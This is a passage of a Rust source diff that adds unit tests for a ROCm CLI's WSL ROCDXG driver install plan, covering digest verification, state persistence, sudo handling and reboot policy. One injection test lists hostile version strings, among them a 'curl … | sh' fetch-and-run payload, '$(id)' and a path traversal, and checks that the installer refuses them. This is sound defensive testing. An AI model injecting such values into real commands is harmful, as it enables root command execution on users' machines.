+                }
+                Ok(())
+            },
+            |state| write_driver_install_state(&paths, state),
+            || {
+                gathered = true;
+                Ok(test_examine("linux", true).driver)
+            },
+        )
+        .expect_err("failed verification must fail the install");
+        let saved = read_driver_install_state(&paths)?.expect("state should remain readable");
+
+        assert_eq!(observed, ["prepare", "execute", "verify"]);
+        assert!(error.to_string().contains("driver command failed: verify"));
+        assert!(
+            !gathered,
+            "post-install state must not be gathered after failure"
+        );
+        assert_eq!(state.executed_at_unix_ms, None);
+        assert!(state.post_driver.is_none());
+        assert_eq!(saved.executed_at_unix_ms, None);
+        assert!(saved.post_driver.is_none());
+        let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
+    #[test]
+    fn failed_post_driver_gather_keeps_executed_state_persisted() -> Result<()> {
+        let (root, paths) = test_paths("driver-gather-failure-state");
+        let mut plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        plan.commands = vec![
+            driver_command(DriverCommandPhase::Prepare, "prepare"),
+            driver_command(DriverCommandPhase::Execute, "execute"),
+            driver_command(DriverCommandPhase::Verify, "verify"),
+        ];
+        let mut state = DriverInstallState {
+            approved_at_unix_ms: 1,
+            executed_at_unix_ms: None,
+            pre_driver: test_examine("linux", true).driver,
+            post_driver: None,
+            boot_id_at_execution: Some("boot".to_owned()),
+            reboot_required: plan.reboot_required,
+            reboot_observed: false,
+            commands: plan.execution_commands(),
+            reconciled_at_unix_ms: None,
+            reconciliation: None,
+        };
+        write_driver_install_state(&paths, &state)?;
+
+        let error = execute_driver_install_plan(
+            &plan,
+            &mut state,
+            |_| Ok(()),
+            |state| write_driver_install_state(&paths, state),
+            || bail!("post-driver gather failed"),
+        )
+        .expect_err("a post-driver gather failure must still fail the install");
+        let saved = read_driver_install_state(&paths)?.expect("state should remain readable");
+
+        assert!(error.to_string().contains("post-driver gather failed"));
+        assert!(saved.executed_at_unix_ms.is_some());
+        assert!(saved.post_driver.is_none());
+        let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
+    #[test]
     fn driver_reconcile_without_state_gives_non_privileged_guidance() -> Result<()> {
         let (root, paths) = test_paths("driver-reconcile-empty");
 
@@ -29420,6 +31794,48 @@ VERSION_CODENAME=noble
         assert_eq!(reconciliation.check_summary.present, 1);
         assert_eq!(reconciliation.check_summary.missing, 1);
         let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
+    #[test]
+    fn driver_reconcile_preserves_explicit_reboot_policy() -> Result<()> {
+        for reboot_required in [false, true] {
+            let (root, paths) = test_paths(if reboot_required {
+                "driver-reconcile-reboot-true"
+            } else {
+                "driver-reconcile-reboot-false"
+            });
+            let driver = rocm_core::DriverSummary {
+                policy: "driver-policy".to_owned(),
+                status: "available".to_owned(),
+                detail: None,
+            };
+            let mut state = DriverInstallState {
+                approved_at_unix_ms: 1,
+                executed_at_unix_ms: Some(2),
+                pre_driver: driver.clone(),
+                post_driver: None,
+                boot_id_at_execution: Some("same-boot".to_owned()),
+                reboot_required,
+                reboot_observed: false,
+                commands: vec!["execute".to_owned()],
+                reconciled_at_unix_ms: None,
+                reconciliation: None,
+            };
+
+            reconcile_driver_install_state(
+                &paths,
+                &mut state,
+                driver,
+                Some("same-boot".to_owned()),
+                Vec::new(),
+            )?;
+            let saved = read_driver_install_state(&paths)?.expect("state should be saved");
+
+            assert_eq!(state.reboot_required, reboot_required);
+            assert_eq!(saved.reboot_required, reboot_required);
+            let _ = fs::remove_dir_all(root);
+        }
         Ok(())
     }
 
@@ -29797,8 +32213,17 @@ VERSION_ID="41"
     }
 
     #[test]
-    fn wsl_install_driver_uses_rocdxg_guidance_without_dkms() {
-        let _env = ScopedTestEnv::with_amd_overrides_cleared();
+    fn wsl_install_driver_installs_rocdxg_without_dkms() {
+        // `dkms: true` is passed deliberately: WSL2 has no kernel module to
+        // build, so the flag must not pull in the bare-metal path.
+        //
+        // `build_driver_install_plan` resolves `${ROCM_CLI_AMDGPU_VERSION:-...}`
+        // from process env before it reaches the WSL branch, and the WSL branch
+        // then reads the three ROCDXG vars — an exported
+        // `ROCM_CLI_ROCDXG_VERSION` would steer this plan into a refusal and
+        // fail the `plan.supported` assertion below. So this reader takes the
+        // guard that clears both sets.
+        let _env = scoped_rocdxg_env();
         let plan = build_driver_install_plan(
             &test_examine("linux", true),
             "",
@@ -29807,12 +32232,500 @@ VERSION_ID="41"
         );
         let rendered = render_driver_install_plan(&plan, false, false);
 
-        assert!(!plan.supported);
+        assert!(plan.supported);
+        assert!(plan.mutating);
         assert_eq!(plan.policy, "wsl_rocdxg");
-        assert!(rendered.contains("approval: not required"));
-        assert!(rendered.contains("execution_commands: <none>"));
-        assert!(rendered.contains("scripts/wsl_setup_rocdxg.sh"));
         assert!(!rendered.contains("amdgpu-dkms"));
+        // The whole point of the bug: the plan must be runnable, and must not
+        // send the user to a file that only exists in a git checkout.
+        assert!(!rendered.contains("execution_commands: <none>"));
+        assert!(!rendered.contains("scripts/"));
+        assert!(rendered.contains("approval: required"));
+    }
+
+    #[test]
+    fn wsl_rocdxg_plan_installs_the_library_and_publishes_it() {
+        // Asserts on the default plan, so it has to take the same guard as the
+        // mutating tests in this binary: a concurrent test exporting
+        // `ROCM_CLI_ROCDXG_VERSION` would otherwise steer this one's plan.
+        let _env = scoped_rocdxg_env();
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        let commands = plan.execution_commands().join("\n");
+
+        // Fetches the release artifact, installs it, and makes the linker see
+        // it. Any one of these missing leaves `wsl_rocdxg_ready` unreachable.
+        assert!(commands.contains("https://github.com/ROCm/librocdxg/releases/download/"));
+        assert!(commands.contains("rocdxg-roct_"));
+        assert!(commands.contains("sudo apt-get install -y '/tmp/rocdxg-roct_"));
+        assert!(commands.contains("sudo ldconfig"));
+
+        // And in that order. `ldconfig` refreshes the cache from what is on
+        // disk now, so running it before `apt-get install` has unpacked
+        // `librocdxg.so` scans a directory that does not contain it yet and
+        // publishes nothing — leaving the plan reporting success while the
+        // `ldconfig -p` verification below is the only thing that would notice.
+        // Both steps are still present under that swap, so every `contains`
+        // assertion in this file stays green; only a position comparison
+        // catches it.
+        let steps = plan.execution_commands();
+        let install = steps
+            .iter()
+            .position(|c| c.contains("apt-get install -y '/tmp/"))
+            .expect("plan installs the package");
+        let publish = steps
+            .iter()
+            .position(|c| c.trim_end().ends_with("ldconfig"))
+            .expect("plan publishes the library");
+        assert!(
+            install < publish,
+            "ldconfig must run after the package is installed:\n{}",
+            steps.join("\n")
+        );
+
+        // Verification asserts the two things `examine` keys `wsl_rocdxg_ready`
+        // on, so a silently partial install cannot report success.
+        let verify = plan
+            .commands
+            .iter()
+            .filter(|c| c.phase == DriverCommandPhase::Verify)
+            .map(|c| c.command.clone())
+            .collect::<Vec<_>>()
+            .join("\n");
+        assert!(verify.contains("/opt/rocm/lib/librocdxg.so"));
+        assert!(verify.contains("ldconfig -p"));
+    }
+
+    #[test]
+    fn wsl_rocdxg_plan_guards_the_gpu_plumbing_before_any_mutating_command() {
+        // /dev/dxg and dxcore come from the Windows side. If they are missing,
+        // installing the bridge library accomplishes nothing, so the plan must
+        // stop rather than report a successful install of something inert.
+        let _env = scoped_rocdxg_env();
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        let prepare = plan
+            .commands
+            .iter()
+            .filter(|c| c.phase == DriverCommandPhase::Prepare)
+            .map(|c| c.command.clone())
+            .collect::<Vec<_>>();
+        let joined = prepare.join("\n");
+        assert!(joined.contains("/dev/dxg"));
+        assert!(joined.contains("/usr/lib/wsl/lib/libdxcore.so"));
+        // Named explicitly, rather than surfacing as `sudo: command not found`
+        // from whichever privileged step happened to run first.
+        assert!(joined.contains("command -v sudo"));
+        // Both guards run before anything is fetched or installed.
+        let first_mutation = plan
+            .execution_commands()
+            .iter()
+            .position(|c| c.contains("apt-get") || c.contains("curl"))
+            .expect("plan installs something");
+        let last_guard = plan
+            .execution_commands()
+            .iter()
+            .rposition(|c| c.contains("is missing"))
+            .expect("plan guards the plumbing");
+        assert!(
+            last_guard < first_mutation,
+            "plumbing guards must precede the first mutating command"
+        );
+    }
+
+    /// Clear every input that steers the ROCDXG plan, so a value exported in
+    /// the developer's or runner's shell cannot decide the outcome of a test
+    /// that is asserting on the default.
+    ///
+    /// Builds on [`ScopedTestEnv::with_amd_overrides_cleared`] rather than
+    /// `new` because a WSL plan reached through `build_driver_install_plan`
+    /// resolves the bare-metal AMDGPU overrides before it dispatches to the WSL
+    /// branch: a caller needing one of these two guards needs both, and one
+    /// helper spares every test from picking the wrong half.
+    fn scoped_rocdxg_env() -> ScopedTestEnv {
+        let mut env = ScopedTestEnv::with_amd_overrides_cleared();
+        env.clear("ROCM_CLI_ROCDXG_VERSION");
+        env.clear(ROCDXG_SHA256_ENV);
+        env.clear(ROCDXG_ALLOW_UNVERIFIED_ENV);
+        env
+    }
+
+    #[test]
+    fn wsl_rocdxg_download_is_verified_against_a_pinned_digest_by_default() {
+        // The package is installed with `apt-get install`, which runs its
+        // maintainer scripts as root. With no digest, TLS to the release host
+        // is the only thing authenticating that download — weaker than the
+        // bare-metal path in this same file, which installs from a
+        // `signed-by=` pinned repository. So the default plan must verify.
+        let _env = scoped_rocdxg_env();
+        let commands = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo).execution_commands();
+        let joined = commands.join("\n");
+
+        let pinned = ROCDXG_PINNED_DIGESTS
+            .iter()
+            .find_map(|(version, digest)| (*version == "1.2.2").then_some(*digest))
+            .expect("the default version is pinned");
+        assert!(joined.contains(pinned), "{joined}");
+        assert!(joined.contains("sha256sum -c -"), "{joined}");
+
+        // Not a conditional: an unset variable must not be able to turn
+        // verification off, which is what the previous `if [ -n ... ]` form
+        // did.
+        assert!(
+            !joined.contains("skipping checksum verification"),
+            "{joined}"
+        );
+        assert!(!joined.contains(ROCDXG_SHA256_ENV), "{joined}");
+
+        // Ordering is the whole point — a digest checked after the install has
+        // already run is decoration.
+        let check = commands
+            .iter()
+            .position(|c| c.contains("sha256sum -c -"))
+            .expect("plan verifies the download");
+        let install = commands
+            .iter()
+            .position(|c| c.contains("apt-get install -y '/tmp/"))
+            .expect("plan installs the package");
+        assert!(check < install, "digest must be checked before install");
+    }
+
+    #[test]
+    fn wsl_rocdxg_refuses_a_version_whose_digest_is_unknown() {
+        // An unpinned version is the case where silently falling back to "no
+        // verification" would be most dangerous, because it is reachable from
+        // a single environment variable.
+        let mut env = scoped_rocdxg_env();
+        env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
+
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert!(!plan.supported);
+        assert!(!plan.mutating);
+        assert!(plan.commands.is_empty(), "a refusal must run nothing");
+        assert!(plan.reason.contains(ROCDXG_SHA256_ENV), "{}", plan.reason);
+        assert!(
+            plan.reason.contains(ROCDXG_ALLOW_UNVERIFIED_ENV),
+            "{}",
+            plan.reason
+        );
+    }
+
+    #[test]
+    fn wsl_rocdxg_accepts_a_supplied_digest_for_an_unpinned_version() {
+        // The escape hatch for a release newer than this build: supply the
+        // digest rather than disabling verification.
+        let mut env = scoped_rocdxg_env();
+        env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
+        let supplied = "a".repeat(64);
+        env.set(ROCDXG_SHA256_ENV, &supplied);
+
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert!(plan.supported);
+        let joined = plan.execution_commands().join("\n");
+        assert!(joined.contains(&supplied), "{joined}");
+        assert!(joined.contains("sha256sum -c -"), "{joined}");
+    }
+
+    #[test]
+    fn wsl_rocdxg_rejects_a_malformed_supplied_digest() {
+        // A truncated or mistyped digest must not silently fall back to the
+        // pinned one, which would verify a different artifact than the user
+        // asked for and report success.
+        let mut env = scoped_rocdxg_env();
+        env.set(ROCDXG_SHA256_ENV, "not-a-digest");
+
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert!(!plan.supported);
+        assert!(plan.commands.is_empty());
+        assert!(plan.reason.contains(ROCDXG_SHA256_ENV), "{}", plan.reason);
+    }
+
+    #[test]
+    fn wsl_rocdxg_unverified_install_takes_an_explicit_opt_out() {
+        // Installing unverified stays possible — it just has to be asked for,
+        // and the plan the user approves has to say so.
+        let mut env = scoped_rocdxg_env();
+        env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
+        env.set(ROCDXG_ALLOW_UNVERIFIED_ENV, "1");
+
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert!(plan.supported);
+        let joined = plan.execution_commands().join("\n");
+        assert!(!joined.contains("sha256sum -c -"), "{joined}");
+        assert!(joined.contains("without verifying it"), "{joined}");
+    }
+
+    #[test]
+    fn wsl_rocdxg_opt_out_reads_negative_values_as_off() {
+        // The opt-out is a boolean, not a presence check. Reading "set to
+        // anything" as yes would turn digest verification off for a package
+        // installed as root on the strength of `=0` — the one value a reader
+        // writes when they mean the opposite.
+        for negative in ["0", "false", "no", "off", ""] {
+            let mut env = scoped_rocdxg_env();
+            env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
+            env.set(ROCDXG_ALLOW_UNVERIFIED_ENV, negative);
+
+            let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+            assert!(
+                !plan.supported,
+                "{ROCDXG_ALLOW_UNVERIFIED_ENV}={negative:?} disabled verification"
+            );
+            assert!(
+                plan.commands.is_empty(),
+                "{ROCDXG_ALLOW_UNVERIFIED_ENV}={negative:?} built an unverified install"
+            );
+        }
+
+        // The affirmative spellings still work, so this is a narrowing of what
+        // counts as yes rather than a removal of the escape hatch.
+        for affirmative in ["1", "true", "yes", "on"] {
+            let mut env = scoped_rocdxg_env();
+            env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
+            env.set(ROCDXG_ALLOW_UNVERIFIED_ENV, affirmative);
+
+            let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+            assert!(
+                plan.supported,
+                "{ROCDXG_ALLOW_UNVERIFIED_ENV}={affirmative:?} was not honoured"
+            );
+        }
+    }
+
+    #[test]
+    fn wsl_rocdxg_refuses_a_version_that_could_escape_the_shell() {
+        // `ROCM_CLI_ROCDXG_VERSION` is interpolated into commands executed via
+        // `sh -c` after `apt-get update` has primed the sudo credential cache,
+        // so a `;` in it would start a second, attacker-chosen command running
+        // as root. The plan must refuse rather than quote its way out.
+        for hostile in [
+            "1.2.0; curl http://example.invalid/x | sh",
+            "1.2.0 && id",
+            "$(id)",
+            "1.2.0`id`",
+            "../../etc/passwd",
+            "1.2.0\nid",
+            "1.2.0 ",
+        ] {
+            let mut env = scoped_rocdxg_env();
+            env.set("ROCM_CLI_ROCDXG_VERSION", hostile);
+            // An opt-out must not buy past the version check either.
+            env.set(ROCDXG_ALLOW_UNVERIFIED_ENV, "1");
+
+            let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+            assert!(!plan.supported, "accepted hostile version {hostile:?}");
+            assert!(
+                plan.commands.is_empty(),
+                "built commands from hostile version {hostile:?}"
+            );
+            // The refused value is echoed back in the plan a human reads, so it
+            // must not be able to forge lines there. Every line the renderer
+            // emits after the header is indented, so an unindented one came
+            // from the value.
+            let rendered = render_driver_install_plan(&plan, false, false);
+            for line in rendered.lines().skip(1) {
+                assert!(
+                    line.starts_with("  "),
+                    "hostile version {hostile:?} forged plan line {line:?} in:\n{rendered}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn wsl_rocdxg_plan_drops_sudo_when_already_root() {
+        // Same reason the bare-metal plans take an escalation: containers and
+        // minimal cloud images run as uid 0 with no `sudo` binary, where an
+        // unconditional prefix kills every command before any driver work.
+        let _env = scoped_rocdxg_env();
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::AlreadyRoot);
+        let joined = plan.execution_commands().join("\n");
+        assert!(!joined.contains("sudo "), "{joined}");
+        assert!(joined.contains("apt-get install -y '/tmp/"), "{joined}");
+        // And it must not demand a binary it no longer uses.
+        assert!(!joined.contains("command -v sudo"), "{joined}");
+        assert!(
+            !plan
+                .preflight_checks
+                .iter()
+                .any(|check| check.contains("`sudo` command is available")),
+            "{:?}",
+            plan.preflight_checks
+        );
+    }
+
+    /// Runs the digest step the plan actually generates, rather than asserting
+    /// that it contains some substrings.
+    ///
+    /// The step this exercises is the trust anchor for a root install, and the
+    /// executable self-test that used to cover it was deleted along with
+    /// `scripts/wsl_setup_rocdxg.sh`. Substring assertions would let a quoting,
+    /// field-order or newline regression in the `printf | sha256sum -c -`
+    /// fragment ship green, so the generated command is pinned whole with
+    /// `assert_eq!` and then executed — with only the two values it embeds
+    /// redirected at a test payload, so the quoting, spacing and field order
+    /// under test are production's rather than a replica's.
+    ///
+    /// Field order in particular is invisible to a `starts_with`/`ends_with`
+    /// pair: `sha256sum -c -` reads `DIGEST  FILENAME`, so emitting the path
+    /// first breaks every real WSL install while still starting with
+    /// `printf '%s  %s\n' '` and ending with `' | sha256sum -c -`.
+    #[cfg(unix)]
+    #[test]
+    fn wsl_rocdxg_generated_digest_step_accepts_only_the_matching_file() {
+        use std::process::Command;
+
+        let _env = scoped_rocdxg_env();
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        let version = plan.repo_version.clone();
+        let pinned = ROCDXG_PINNED_DIGESTS
+            .iter()
+            .find_map(|(pinned_version, digest)| {
+                (*pinned_version == version.as_str()).then_some(*digest)
+            })
+            .expect("the default version is pinned");
+        let deb_path = format!("/tmp/rocdxg-roct_{version}_amd64.deb");
+        let generated = plan
+            .execution_commands()
+            .into_iter()
+            .find(|c| c.contains("sha256sum -c -"))
+            .expect("plan verifies the download");
+
+        // Whole-string, not `contains`: the digest has to come first and the
+        // two fields have to be separated by exactly the two spaces
+        // `sha256sum -c -` expects.
+        assert_eq!(
+            generated,
+            format!("printf '%s  %s\\n' '{pinned}' '{deb_path}' | sha256sum -c -")
+        );
+
+        let (root, _paths) = test_paths("wsl-rocdxg-digest");
+        fs::create_dir_all(&root).expect("test root");
+        let payload = root.join(format!("rocdxg-roct_{version}_amd64.deb"));
+        fs::write(&payload, b"pretend this is a .deb\n").expect("write payload");
+
+        let digest_of = |path: &Path| -> String {
+            let out = Command::new("sha256sum")
+                .arg(path)
+                .output()
+                .expect("sha256sum runs");
+            assert!(out.status.success());
+            String::from_utf8(out.stdout)
+                .expect("utf8")
+                .split_whitespace()
+                .next()
+                .expect("digest field")
+                .to_owned()
+        };
+        let good = digest_of(&payload);
+
+        // The command under test is the generated one; the only edits are the
+        // digest being checked and the path being checked, so a regression in
+        // how the fragment is built reaches `sh` here instead of being masked
+        // by a replica built to the test's own idea of the right shape.
+        let step = |digest: &str| -> bool {
+            let command = generated
+                .replace(pinned, digest)
+                .replace(&deb_path, &payload.display().to_string());
+            Command::new("sh")
+                .arg("-c")
+                .arg(&command)
+                .output()
+                .expect("sh runs")
+                .status
+                .success()
+        };
+
+        assert!(step(&good), "the matching digest must pass");
+        assert!(
+            !step(&"0".repeat(64)),
+            "a mismatched digest must fail the step"
+        );
+        assert!(!step("deadbeef"), "a malformed digest must fail the step");
+        assert!(!step(""), "an empty digest must fail the step");
+
+        let _ = fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn wsl_rocdxg_install_does_not_ask_for_a_reboot() {
+        // ROCDXG is userspace: `ldconfig` publishes it in this boot. The
+        // bare-metal DKMS path is the one that needs a reboot.
+        let _env = scoped_rocdxg_env();
+        let wsl = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert!(!wsl.reboot_required);
+        let rendered = render_driver_install_plan(&wsl, false, false);
+        // Anchor on the install step first: a refusal plan also reports
+        // `reboot_required: false`, renders `post_install_checks:` from its
+        // non-empty `checks`, and contains no `post_reboot` — so the three
+        // assertions below hold against a plan that installs nothing at all.
+        // Only a real install plan carries this command.
+        assert!(
+            rendered.contains("apt-get install -y '/tmp/"),
+            "expected a real install plan, got:\n{rendered}"
+        );
+        assert!(rendered.contains("post_install_checks:"));
+        assert!(!rendered.contains("post_reboot"));
+
+        let bare_metal = build_driver_install_plan(
+            &test_examine("linux", false),
+            "ID=ubuntu\nVERSION_ID=\"24.04\"\nVERSION_CODENAME=noble\n",
+            true,
+            PrivilegeEscalation::Sudo,
+        );
+        assert!(bare_metal.reboot_required);
+        assert!(render_driver_install_plan(&bare_metal, false, false).contains("post_reboot"));
+    }
+
+    #[test]
+    fn wsl_rocdxg_version_is_overridable_and_reaches_every_reference() {
+        // One resolved value drives the archive name, the release tag and the
+        // download path, so an override cannot leave a URL pointing at the
+        // default. The value is resolved at plan-build time rather than left as
+        // a `${VAR:-default}` template, so the plan the user reviews names the
+        // build the install will actually fetch.
+        let mut env = scoped_rocdxg_env();
+
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert_eq!(plan.repo_version, "1.2.2");
+        let commands = plan.execution_commands().join("\n");
+        // The version is resolved here, not deferred to the shell: the plan the
+        // user approves has to name the build the install will actually fetch.
+        // No `${...}` expansion survives into the commands at all — the digest
+        // is resolved at plan-build time too, which
+        // `wsl_rocdxg_download_is_verified_against_a_pinned_digest_by_default`
+        // asserts by name.
+        assert!(
+            !commands.contains("ROCM_CLI_ROCDXG_VERSION"),
+            "version must be resolved at plan-build time, not left as a shell template:\n{commands}"
+        );
+        let occurrences = commands.matches("1.2.2").count();
+        assert!(
+            occurrences >= 3,
+            "version should drive the deb name, the tag and the path; saw {occurrences}"
+        );
+
+        // An override has to reach every one of those references, including the
+        // release URL — the bug this guards is a URL left on the default. The
+        // digest comes along because an unpinned version is refused outright;
+        // see `wsl_rocdxg_refuses_a_version_whose_digest_is_unknown`.
+        env.set("ROCM_CLI_ROCDXG_VERSION", "9.9.9");
+        env.set(ROCDXG_SHA256_ENV, &"b".repeat(64));
+        let overridden = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        assert_eq!(overridden.repo_version, "9.9.9");
+        let commands = overridden.execution_commands().join("\n");
+        assert!(
+            commands.contains("rocdxg-roct_9.9.9_amd64.deb"),
+            "{commands}"
+        );
+        assert!(
+            commands.contains(
+                "https://github.com/ROCm/librocdxg/releases/download/v9.9.9/rocdxg-roct_9.9.9_amd64.deb"
+            ),
+            "{commands}"
+        );
+        assert!(
+            !commands.contains("1.2.2"),
+            "override left a reference on the default version:\n{commands}"
+        );
     }
 
     // EAI-7406: distro selection must honor `/etc/os-release` `ID_LIKE`, so that
